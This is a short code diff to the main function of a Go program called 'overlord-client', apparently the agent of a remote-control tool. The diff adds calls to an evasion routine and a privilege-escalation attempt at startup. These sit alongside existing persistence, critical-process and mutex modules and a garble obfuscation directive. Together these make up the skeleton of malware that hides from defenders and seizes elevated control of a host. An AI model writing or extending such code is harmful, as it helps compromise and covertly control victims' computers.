@@ -6,13 +6,19 @@ import (
 
 	"overlord-client/cmd/agent/config"
 	"overlord-client/cmd/agent/criticalproc"
+	"overlord-client/cmd/agent/evasion"
 	"overlord-client/cmd/agent/mutex"
 	"overlord-client/cmd/agent/persistence"
+	"overlord-client/cmd/agent/privesc"
 	"overlord-client/cmd/agent/webrtcpub"
 )
 
 func main() {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
+	evasion.Run()
+	if !privesc.IsElevated() {
+		privesc.TryElevate()
+	}
 	installHardCrashReporter()
 	cfg := config.Load()
 
